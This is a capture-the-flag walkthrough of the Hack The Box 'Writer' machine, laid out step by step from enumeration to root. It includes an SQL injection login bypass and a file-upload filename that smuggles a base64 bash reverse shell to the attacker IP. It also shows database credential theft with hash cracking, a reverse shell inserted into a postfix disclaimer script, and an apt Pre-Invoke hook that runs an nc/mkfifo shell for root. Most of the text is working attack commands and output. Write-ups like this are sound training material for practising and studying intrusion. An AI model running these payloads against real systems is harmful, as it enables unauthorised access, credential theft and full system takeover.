## Default Information
IP address : 10.10.11.101\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.11.101 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 139	| netbios-ssn | Samba smbd 4.6.2 | Open |
| 445	| netbios-ssn | Samba smbd 4.6.2 | Open |

Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.11.101 -T4 -vv 
```

Before we continue furthur, we will add the IP address ```10.10.11.101``` to ```writer.htb``` in our ```/etc/hosts``` file. 

```
10.10.11.101    writer.htb
```

## Discovery
Firstly, We will now run ```gobuster``` on ```http://writer.htb``` to enumerate the directories on the endpoints. From the output, we discover an interesting ```/adminstrative``` endpoint.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://writer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://writer.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/11 13:46:22 Starting gobuster in directory enumeration mode
===============================================================
http://writer.htb/contact              (Status: 200) [Size: 4905]
http://writer.htb/about                (Status: 200) [Size: 3522]
http://writer.htb/static               (Status: 301) [Size: 309] [--> http://writer.htb/static/]
http://writer.htb/logout               (Status: 302) [Size: 208] [--> http://writer.htb/]       
http://writer.htb/dashboard            (Status: 302) [Size: 208] [--> http://writer.htb/]       
http://writer.htb/administrative       (Status: 200) [Size: 1443]                               
http://writer.htb/server-status        (Status: 403) [Size: 275]                                
                                                                                                
===============================================================
2021/09/11 14:06:47 Finished
===============================================================
```
 From the output, we realize that there is a ```/administrative``` endpoint that returns a status code of 200 and visiting this site brings us to an admin login page
 
 ![admin login page](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/admin_login.PNG)
 
 Looking at the login page, we realize that the admin login page is vulnerable to SQL injection attacks. Uisng ```admin'or 1=1 or ''='``` as the username, we realize that we are able to login to the webpage, and we will be redirected to the ```/dashboard``` endpoint
 
![dashboard endpoint](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/dashboard.PNG)
 
Looking through the website, we notice that there is a ```/dashboard/stories/<post id>``` endpoint that allows for file upload, but we can only upload JPEG files
![JPEG File Upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/file_upload.PNG)

Upon the upload of the file, we notice that the file will be saved in ```http://writer.htb/static/img/``` and the image will be updated at ```http://writer.htb/blog/post/<post id>```

Now, we will create a base64-encoded reverse shell payload. Afterwards, we have to create a JPEG image with the payload.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/3000 0>&1"' | base64
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8zMDAwIDA+
JjEi
                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ touch '1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNy8zMDAwIDA+JjEi| base64 -d | bash`;'
```

Afterwards, we will intercept the POST request during file upload to create the reverse shell.
![Modifying request using burp](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/file_burp.PNG)

## Obtaining user shell
Now, we would have obtained a reverse shell. We will first stabilize the shell
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000             
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.101] 49678
bash: cannot set terminal process group (981): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@writer:/$ export TERM=xterm
export TERM=xterm
www-data@writer:/$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@writer:/$ 
```

Now we also realize that there are 2 users -- ```john``` and ```kyle``` on this terminal

```
www-data@writer:/$ cd home
cd home
www-data@writer:/home$ ls
ls
john  kyle
www-data@writer:/home$ 
```

Navigating to ```/etc/mysql``` we are able to find a ```mariadb.cnf``` that contains credentials to the mysql database

```
www-data@writer:/home$ cd /etc/mysql
cd /etc/mysql
www-data@writer:/etc/mysql$ ls
ls
conf.d  debian-start  debian.cnf  mariadb.cnf  mariadb.conf.d  my.cnf  my.cnf.fallback
www-data@writer:/etc/mysql$ cat mariadb.cnf
cat mariadb.cnf
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
www-data@writer:/etc/mysql$ mysql -u djangouser -h localhost -p
mysql -u djangouser -h localhost -p
Enter password: DjangoSuperPassword

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```

Now, we will login to the mysql database and try to obtain the credentials to login to the ssh server. 
```
MariaDB [dev]> show tables;
show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

MariaDB [dev]> select * from auth_user;
select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
```

We will first try to identify the hash type and the hash is identified to possibly be Django hash using HashCat
```
┌──(kali㉿kali)-[~]
└─$ hashcat -h | grep "PBKDF2-SHA256"
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating System
  10000 | Django (PBKDF2-SHA256)                           | Framework
```
Afterwards, we will now we will use HashCat to decode the hash and obtain the password. The password is obtained to be ```marcoantonio```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 10000 hash.txt rockyou.txt  
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 10000 hash.txt rockyou.txt --show                                             3 ⚙
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

Finally, we will now ssh into the user ```kyle``` and obtain the user flag.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh kyle@10.10.11.101                                                                    3 ⚙
The authenticity of host '10.10.11.101 (10.10.11.101)' can't be established.
ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.101' (ECDSA) to the list of known hosts.
kyle@10.10.11.101's password: 
Last login: Fri Sep 17 16:56:56 2021 from 10.10.14.15
kyle@writer:~$ ls
user.txt
kyle@writer:~$ cat user.txt
<Redacted user flag>
kyle@writer:~$ 
```

## Obtaining root flag

Firstly, we will check if the user ```kyle``` is able to execute any programs with root privileges. It seems that ```kyle``` cannot execute any programs with root privileges.

```
kyle@writer:~$ sudo -l
[sudo] password for kyle: 
Sorry, user kyle may not run sudo on writer.
```

Next, we will run ```linpeas``` script on the SSH server to discover potential privilege escalation vectors. From the output, we have discovered that there are mail applications running on the SSH server and we have a ```postfix``` service which is an SMTP.

![mail applications running on the server](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/mail_applications.PNG)

![Postfix](https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/smtp_postfix.PNG)

From ```/etc/postfix```, we were also able to discover the addresses of Kyle and root user.

```
kyle@writer:~$ cd /etc/postfix && ls
disclaimer            dynamicmaps.cf    main.cf.proto  master.cf.proto  postfix-script
disclaimer_addresses  dynamicmaps.cf.d  makedefs.out   postfix-files    post-install
disclaimer.txt        main.cf           master.cf      postfix-files.d  sasl
kyle@writer:/etc/postfix$ cat disclaimer_addresses
root@writer.htb
kyle@writer.htb
```
Now, we will modify the ```/etc/postfix/disclaimer``` file to create a reverse shell command (NOTE the extra bash command)

```
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail
bash -i &>/dev/tcp/10.10.16.7/4444 0>&1

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Next, we will write a python script to send a SMTP message 

```
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

host = "127.0.0.1"
port = 25

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "kyle@writer.htb"
msg['To'] = "kyle@writer.htb"
msg['Subject'] = "This is not a drill!"

# payload 
message = ("test message")

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host,port)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```

Afterwards, we will copy the modified disclaimer file to ```/etc/postfix/disclaimer``` (because I notice that the modified /etc/postfix/disclaimer gets overwritten every time I execute the script) and execute the script to get a reverse shell. 

```
kyle@writer:~$ cp disclaimer /etc/postfix/disclaimer && python3 send.py
[*] Payload is generated : test message
[***]successfully sent email to kyle@writer.htb:
```

Now, we will have obtained the reverse shell. We will first stabilize the shell. However, we noticed that we have only obtained the reverse shell for the user ```john```.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.101] 50386
bash: cannot set terminal process group (1243409): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ix$ python3 -c 'import pty; pty.spawn("/bin/bash")'
john@writer:/var/spool/postfix$ export TERM=xterm
export TERM=xterm
john@writer:/var/spool/postfix$ stty cols 132 rows 34
stty cols 132 rows 34
john@writer:/var/spool/postfix$ id
id
uid=1001(john) gid=1001(john) groups=1001(john)
```

Next, what we have to do is to save the ```id_rsa``` file into our local machine so that we can SSH into ```john```

```
john@writer:/$ cd /home/john/.ssh
cd /home/john/.ssh
john@writer:/home/john/.ssh$ ls -la
ls -la
total 20
drwx------ 2 john john 4096 Jul  9 12:29 .
drwxr-xr-x 4 john john 4096 Aug  5 09:56 ..
-rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys
-rw------- 1 john john 2602 Jul  9 12:29 id_rsa
-rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub
john@writer:/home/john/.ssh$ cat id_rsa

┌──(kali㉿kali)-[~/Desktop]
└─$ nano id_rsa   
                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ chmod 600 id_rsa 

──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_rsa john@10.10.11.101                                     
Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$ 
```

Executing Linpeas.sh script on user ```john```, we realize that ```john``` is part of the ```management``` group and this group have a writable file ```/etc/apt/apt.conf.d```

```
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

<img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/apt_management.PNG" width = "1000">

From the POSTFIX files, we realize that the ```disclaimer``` program will be executed when the user is ```john```. This would tell use that modification of ```/etc/apt/apt.conf.d``` directory will be executed by ```disclaimer```.

```
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Now, we will try to create a reverse shell by creating a payload in the ```/etc/apt/apt.conf.d``` directory

```
john@writer:~$ cd /etc/apt/apt.conf.d
john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f"};' > payload
```

Finally, we will stabilize the shell and extract the system flag

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.101] 45550
/bin/sh: 0: can't access tty; job control turned off
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@writer:/tmp# export TERM=xterm
export TERM=xterm
root@writer:/tmp# stty cols 132 rows 34
stty cols 132 rows 34
root@writer:/tmp# cd
cd
root@writer:~# ls
ls
root.txt  snap
root@writer:~# cat root.txt
cat root.txt
<Redacted system flag>
root@writer:~#
```
